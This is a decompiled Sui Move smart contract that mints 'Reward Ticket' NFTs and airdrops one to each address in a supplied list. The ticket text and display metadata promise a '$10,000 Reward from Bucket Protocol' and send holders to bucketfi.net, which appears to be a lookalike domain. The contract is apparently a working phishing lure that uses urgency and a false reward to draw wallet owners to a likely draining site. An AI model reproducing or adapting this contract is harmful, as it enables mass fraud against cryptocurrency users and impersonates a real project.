module 0xeb08a2ff8a5c900e3a02b52213a20a7a92539a9562744028363d370f3da6a207::reward1879 {
    struct REWARD1879 has drop {
        dummy_field: bool,
    }

    struct TICKET_1879 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward1879(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_1879{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729586013/bucketfinet_1022_0_wo2qx5.jpg"),
                description : 0x1::string::utf8(b"Claim your $10,000 Reward from Bucket Protocol! Visit https://bucketfi.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_1879>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729586013/bucketfinet_1022_0_wo2qx5.jpg"),
                description : 0x1::string::utf8(b"Claim your $10,000 Reward from Bucket Protocol! Visit https://bucketfi.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_1879>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD1879, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729586013/bucketfinet_1022_0_wo2qx5.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your $10,000 Reward from Bucket Protocol! Visit https://bucketfi.net to verify and receive your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://bucketfi.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Bucket Protocol"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<REWARD1879>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_1879>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_1879>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_1879>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

